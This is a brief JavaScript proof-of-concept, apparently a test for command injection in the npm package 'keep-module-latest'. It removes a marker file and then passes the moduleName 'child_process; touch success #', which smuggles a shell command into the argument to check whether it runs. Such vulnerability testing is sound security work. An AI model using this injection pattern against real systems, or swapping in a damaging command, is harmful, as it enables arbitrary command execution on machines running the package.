let fs = require('fs');
let root = require('keep-module-latest');
let path = "./success";
if (fs.existsSync(path))
  fs.unlinkSync(path);

resolve(root({ moduleName: "child_process; touch success #" }));
